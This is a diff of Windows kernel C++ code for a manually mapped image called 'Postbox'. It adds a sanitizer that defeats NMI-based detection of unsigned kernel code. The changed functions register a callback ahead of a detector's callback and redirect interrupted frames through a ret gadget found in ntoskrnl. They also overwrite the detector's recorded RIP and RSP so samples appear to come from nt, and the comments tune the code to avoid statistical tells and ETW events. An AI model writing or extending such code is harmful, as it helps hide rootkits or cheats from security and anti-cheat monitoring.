@@ -227,8 +227,11 @@ struct PostboxNmiSanitizeState
 {
     uint64_t Handle;
     uint64_t ListHead;
-    uint64_t FakeRip;
-    uint64_t FakeStack;
+    uint64_t ImageBase;
+    uint64_t ImageSize;
+    uint64_t NtBase;
+    uint64_t NtSize;
+    uint64_t RetGadget;
     uint64_t DetectorBase;
     uint64_t DetectorSize;
     uint64_t Register;
@@ -591,20 +594,8 @@ cleanup:
 }
 #endif
 
-#ifdef NMI_PROBE
-// Test-only NMI callback probe. This is the detector-side mechanism from
-// donnaskiez/nmi: KeRegisterNmiCallback + HalSendNMI, read the interrupted
-// machine frame from the NMI IST stack, then check RIP against
-// PsLoadedModuleList. Never part of the shipped build.
+#if defined(NMI_PROBE) || defined(NMI_SANITIZE)
 #include <intrin.h>
-
-using FnKeRegisterNmiCallback = void* (*)(uint8_t (*)(void*, uint8_t), void*);
-using FnKeDeregisterNmiCallback = int32_t (*)(void*);
-using FnKeQueryActiveProcessorCount = uint32_t (*)(uint32_t*);
-using FnKeGetCurrentProcessorNumberEx = uint32_t (*)(void*);
-using FnKeInitializeAffinityEx = void (*)(void*);
-using FnKeAddProcessorAffinityEx = void (*)(void*, int32_t);
-using FnHalSendNMI = void (*)(void*);
 
 #pragma pack(push, 1)
 struct PostboxTss64
@@ -635,6 +626,21 @@ struct PostboxMachineFrame
     uint64_t Ss;
 };
 #pragma pack(pop)
+#endif
+
+#ifdef NMI_PROBE
+// Test-only NMI callback probe. This is the detector-side mechanism from
+// donnaskiez/nmi: KeRegisterNmiCallback + HalSendNMI, read the interrupted
+// machine frame from the NMI IST stack, then check RIP against
+// PsLoadedModuleList. Never part of the shipped build.
+using FnKeRegisterNmiCallback = void* (*)(uint8_t (*)(void*, uint8_t), void*);
+using FnKeDeregisterNmiCallback = int32_t (*)(void*);
+using FnKeQueryActiveProcessorCount = uint32_t (*)(uint32_t*);
+using FnKeGetCurrentProcessorNumberEx = uint32_t (*)(void*);
+using FnKeInitializeAffinityEx = void (*)(void*);
+using FnKeAddProcessorAffinityEx = void (*)(void*, int32_t);
+using FnHalSendNMI = void (*)(void*);
+using FnKeSetPriorityThread = int32_t (*)(void*, int32_t);
 
 struct PostboxAffinityEx
 {
@@ -700,10 +706,20 @@ static void PostboxNmiSpin(uint32_t Ms)
     // RIP outside PsLoadedModuleList. 2 GHz is a conservative TSC estimate; the
     // exact duration is not important, only that it outlasts one detector poll.
     if (Ms > 30000) Ms = 30000;
+    const address Nt = GetNtoskrnl();
+    address SetPriority = 0;
+    if (Nt) SetPriority = FindFuncExports(Nt, "KeSetPriorityThread");
+    const uint64_t Kpcr = __readmsr(0xC0000101);
+    void* Thread = *(void**) (uintptr_t) (Kpcr + 0x188);
+    int32_t OldPriority = 0;
+    if (SetPriority && Thread)
+        OldPriority = ((FnKeSetPriorityThread) SetPriority)(Thread, 31);
     const uint64_t Start = __rdtsc();
     const uint64_t Ticks = (uint64_t) Ms * 2000000ull;
     while ((__rdtsc() - Start) < Ticks)
         __asm__ __volatile__("pause");
+    if (SetPriority && Thread)
+        ((FnKeSetPriorityThread) SetPriority)(Thread, OldPriority);
 }
 
 static uint32_t PostboxNmiProbe(PostboxNmiProbeResult* Out)
@@ -867,20 +883,109 @@ static uint64_t PostboxNmiFindListHead(address Register)
     return 0;
 }
 
-static uint8_t PostboxNmiSanitizeCallback(void* Context, uint8_t Handled)
+static void PostboxNmiFindNt(PostboxState* S, address Nt)
+{
+    S->NmiSanitize.NtBase = (uint64_t) (uintptr_t) Nt;
+    S->NmiSanitize.NtSize = 0;
+    const uint64_t Head = S->Caches.PsLoadedModuleList;
+    if (!Head) return;
+    auto* List = (_LIST_ENTRY*) (uintptr_t) Head;
+    auto* Link = List->Flink;
+    for (uint32_t i = 0; i < 0x1000 && Link && Link != List; ++i)
+    {
+        if ((uint64_t) (uintptr_t) Link < 0xFFFF800000000000ull) break;
+        auto* Entry = CONTAINING_RECORD(Link, _KLDR_DATA_TABLE_ENTRY, InLoadOrderLinks);
+        if ((uint64_t) (uintptr_t) Entry->DllBase == (uint64_t) (uintptr_t) Nt)
+        {
+            S->NmiSanitize.NtSize = Entry->SizeOfImage;
+            return;
+        }
+        Link = Link->Flink;
+    }
+}
+
+// First 0xC3 in an executable nt section. Executing at that byte is a valid ret;
+// the frame trampoline uses it to pop the original RIP and resume the mapped code.
+static uint64_t PostboxNmiFindRetGadget(address Nt, uint64_t NtSize)
+{
+    if (!Nt || NtSize < 0x1000) return 0;
+    auto* Dos = (_IMAGE_DOS_HEADER*) (uintptr_t) Nt;
+    if (Dos->e_magic != 0x5A4D) return 0;
+    if (Dos->e_lfanew < 0x40 ||
+        (uint64_t) Dos->e_lfanew + sizeof(_IMAGE_NT_HEADERS64) > NtSize) return 0;
+    auto* NtHdr = (_IMAGE_NT_HEADERS64*) ((uint8_t*) (uintptr_t) Nt + Dos->e_lfanew);
+    if (NtHdr->Signature != 0x4550) return 0;
+    auto* Sec = (_IMAGE_SECTION_HEADER*)
+        ((uint8_t*) &NtHdr->OptionalHeader + NtHdr->FileHeader.SizeOfOptionalHeader);
+    for (uint16_t i = 0; i < NtHdr->FileHeader.NumberOfSections; ++i)
+    {
+        if (!(Sec[i].Characteristics & 0x20000000u)) continue;   // IMAGE_SCN_MEM_EXECUTE
+        const uint64_t Va = (uint64_t) (uintptr_t) Nt + Sec[i].VirtualAddress;
+        const uint64_t Size = Sec[i].Misc.VirtualSize;
+        if (Va < (uint64_t) (uintptr_t) Nt || Va + Size > (uint64_t) (uintptr_t) Nt + NtSize)
+            continue;
+        const uint8_t* P = (const uint8_t*) (uintptr_t) Va;
+        for (uint64_t j = 0; j < Size; ++j)
+            if (P[j] == 0xC3) return Va + j;
+    }
+    return 0;
+}
+
+// Redirect a mapped interrupted RIP to an nt ret gadget. The original RIP is
+// written just below the interrupted RSP; the gadget pops it and resumes the
+// mapped code with the original RSP. No IDT/TSS change; only the saved frame.
+static void PostboxNmiFrameTrampoline(PostboxState* S, PostboxMachineFrame* Frame,
+                                      uint64_t StackLimit, uint64_t StackBase)
+{
+    if (!Frame || !S->NmiSanitize.RetGadget) return;
+    const uint64_t Rip = Frame->Rip;
+    if (Rip < S->NmiSanitize.ImageBase ||
+        Rip >= S->NmiSanitize.ImageBase + S->NmiSanitize.ImageSize) return;
+    const uint64_t Rsp = Frame->Rsp;
+    if (!StackLimit || !StackBase || Rsp <= StackLimit || Rsp > StackBase ||
+        Rsp - 8 < StackLimit) return;
+    *(uint64_t*) (uintptr_t) (Rsp - 8) = Rip;
+    Frame->Rip = S->NmiSanitize.RetGadget;
+    Frame->Rsp = Rsp - 8;
+}
+
+extern "C" uint8_t PostboxNmiSanitizeEntry(void* Context, uint8_t Handled);
+extern "C" uint8_t PostboxNmiSanitizeCallback(void* Context, uint8_t Handled,
+                                               uint64_t EntryRsp, uint64_t RetAddr)
 {
     (void) Handled;
     auto* S = (PostboxState*) Context;
-    if (!S || !S->NmiSanitize.Active || !S->NmiSanitize.ListHead) return 0;
+    if (!S || !S->NmiSanitize.Active || !S->NmiSanitize.ListHead) return 1;
+
+    const uint64_t Kpcr = __readmsr(0xC0000101);
+    uint64_t StackLimit = 0;
+    uint64_t StackBase = 0;
+    void* Thread = *(void**) (uintptr_t) (Kpcr + 0x188);
+    if (Thread)
+    {
+        StackLimit = *(uint64_t*) ((uint8_t*) Thread + 0x30);
+        StackBase = *(uint64_t*) ((uint8_t*) Thread + 0x38);
+    }
+    uint64_t InterruptedRip = 0;
+    auto* Tss = *(PostboxTss64**) (uintptr_t) (Kpcr + 8);
+    if (Tss && Tss->Ist3)
+    {
+        auto* Frame = (PostboxMachineFrame*)
+            (uintptr_t) (Tss->Ist3 - sizeof(PostboxMachineFrame));
+        InterruptedRip = Frame->Rip;
+        PostboxNmiFrameTrampoline(S, Frame, StackLimit, StackBase);
+    }
+    const bool Mapped = InterruptedRip >= S->NmiSanitize.ImageBase &&
+                        InterruptedRip < S->NmiSanitize.ImageBase + S->NmiSanitize.ImageSize;
 
     uint32_t Core = 0;
     if (S->NmiSanitize.GetProc)
         Core = ((FnNmiGetProc) S->NmiSanitize.GetProc)(nullptr);
-    if (Core >= 64) Core = 0;
+    if (Core >= 64) return 1;
 
     const uint64_t DetectorBase = S->NmiSanitize.DetectorBase;
     const uint64_t DetectorEnd = DetectorBase + S->NmiSanitize.DetectorSize;
-    if (!DetectorBase || !S->NmiSanitize.DetectorSize) return 0;
+    if (!DetectorBase || !S->NmiSanitize.DetectorSize) return 1;
 
     uint64_t Entry = *(uint64_t*) (uintptr_t) S->NmiSanitize.ListHead;
     for (uint32_t i = 0; i < 64 && Entry; ++i)
@@ -890,16 +995,22 @@ static uint8_t PostboxNmiSanitizeCallback(void* Context, uint8_t Handled)
         const uint64_t Ctx = *(uint64_t*) (uintptr_t) (Entry + 0x10);
         if (CallbackFn >= DetectorBase && CallbackFn < DetectorEnd && Ctx)
         {
-            auto* Nmi = (PostboxDetectorNmiContext*) (uintptr_t) Ctx;
-            Nmi[Core].Rip = S->NmiSanitize.FakeRip;
-            Nmi[Core].Rsp = S->NmiSanitize.FakeStack;
-            Nmi[Core].Count = 1;
-            Nmi[Core].User = 0;
-            return 0;
+            // Only touch the record when the hardware frame was actually in the
+            // mapped image. A real nt sample is already plausible; rewriting it
+            // would make every record identical (time-series tell).
+            if (Mapped)
+            {
+                auto* Nmi = (PostboxDetectorNmiContext*) (uintptr_t) Ctx;
+                Nmi[Core].Rip = RetAddr ? RetAddr : S->NmiSanitize.NtBase;
+                Nmi[Core].Rsp = EntryRsp;
+                Nmi[Core].Count = 1;
+                Nmi[Core].User = 0;
+            }
+            return 1;
         }
         Entry = Next;
     }
-    return 0;
+    return 1;
 }
 
 static bool PostboxNmiListHasDetector(PostboxState* S)
@@ -941,7 +1052,7 @@ static bool PostboxNmiOrderOk(PostboxState* S, uint64_t Self)
     return true;
 }
 
-static bool PostboxNmiSanitizeInit(PostboxState* S)
+static bool PostboxNmiSanitizeInit(PostboxState* S, uint64_t ImageBase, uint64_t ImageSize)
 {
     if (!S) return false;
     auto& N = S->NmiSanitize;
@@ -961,14 +1072,13 @@ static bool PostboxNmiSanitizeInit(PostboxState* S)
     N.Deregister = Deregister;
     N.GetProc = GetProc;
     N.ListHead = ListHead;
-    // Any address inside ntoskrnl satisfies the detector's module-range check.
-    N.FakeRip = Register;
-    // Fake NMI stack inside the unused tail of the state page. A stack walk from
-    // the detector's recorded RSP sees only nt addresses.
-    uint64_t* Fake = (uint64_t*) ((uint8_t*) S + 0x800);
-    for (uint32_t i = 0; i < 0x100; ++i) Fake[i] = Register;
-    N.FakeStack = (uint64_t) (uintptr_t) ((uint8_t*) S + 0x1000 - 0x40);
+    N.ImageBase = ImageBase;
+    N.ImageSize = ImageSize;
+    PostboxNmiFindNt(S, Nt);
+    N.RetGadget = PostboxNmiFindRetGadget(Nt, N.NtSize);
     PostboxNmiFindDetector(S);
+    // Do not create a KNMI node/ETW event on a system with no detector module.
+    if (!N.DetectorBase || !N.DetectorSize) return false;
 
     for (uint32_t Attempt = 0; Attempt < 4; ++Attempt)
     {
@@ -979,11 +1089,11 @@ static bool PostboxNmiSanitizeInit(PostboxState* S)
         for (uint32_t i = 0; i < 50 && PostboxNmiListHasDetector(S); ++i)
             ((FnKeDelayExecutionThread) g_KeDelayExecutionThread)(0, 0, &Delay);
 
-        void* Handle = ((FnNmiRegister) Register)(&PostboxNmiSanitizeCallback, S);
+        void* Handle = ((FnNmiRegister) Register)(&PostboxNmiSanitizeEntry, S);
         if (!Handle) return false;
         N.Handle = (uint64_t) (uintptr_t) Handle;
 
-        if (PostboxNmiOrderOk(S, (uint64_t) (uintptr_t) &PostboxNmiSanitizeCallback))
+        if (PostboxNmiOrderOk(S, (uint64_t) (uintptr_t) &PostboxNmiSanitizeEntry))
         {
             N.Active = 1;
             return true;
@@ -999,10 +1109,20 @@ static void PostboxNmiSanitizeStop(PostboxState* S)
 {
     if (!S || !S->NmiSanitize.Active) return;
     if (S->NmiSanitize.Handle && S->NmiSanitize.Deregister)
-        ((FnNmiDeregister) S->NmiSanitize.Deregister)(
+    {
+        const int32_t Status = ((FnNmiDeregister) S->NmiSanitize.Deregister)(
             (void*) (uintptr_t) S->NmiSanitize.Handle);
+        if (Status < 0)
+        {
+            // The callback may still be registered. Keep the state and handle so
+            // the page is not wiped under a live callback; the caller must not
+            // free the image in this case.
+            return;
+        }
+    }
     S->NmiSanitize.Handle = 0;
     S->NmiSanitize.Active = 0;
+    __builtin_memset(&S->NmiSanitize, 0, sizeof(S->NmiSanitize));
 }
 #endif
 
@@ -2042,6 +2162,10 @@ bool PostboxStart(const PostboxConfig* Config)
     // wiped. The Config.Reserved gate above guarantees the independent layout.
     PostboxStatePtr->ReaperBase = Config->Layout.RawBase;
     PostboxStatePtr->ReaperSize = Config->Layout.AllocSize;
+    // Capture the mapped image range for the NMI frame trampoline before the
+    // layout copy is wiped.
+    const uint64_t ImageBase = Config->Layout.ImageBase;
+    const uint64_t ImageSize = Config->Layout.ImageSize;
     // The section map is only needed by ProtectImageSections(), which ran before
     // this copy. Do not leave the RVAs/sizes in the resident .data image.
     PostboxWipe(&PostboxStatePtr->Cfg.Layout, sizeof(PostboxStatePtr->Cfg.Layout));
@@ -2161,7 +2285,7 @@ bool PostboxStart(const PostboxConfig* Config)
     PostboxWipe(PostboxStatePtr->Stage, StageAllocBytes);
 
 #ifdef NMI_SANITIZE
-    if (!PostboxNmiSanitizeInit(PostboxStatePtr))
+    if (!PostboxNmiSanitizeInit(PostboxStatePtr, ImageBase, ImageSize))
         print(WARN("Postbox: NMI sanitizer inactive"));
 #endif
 
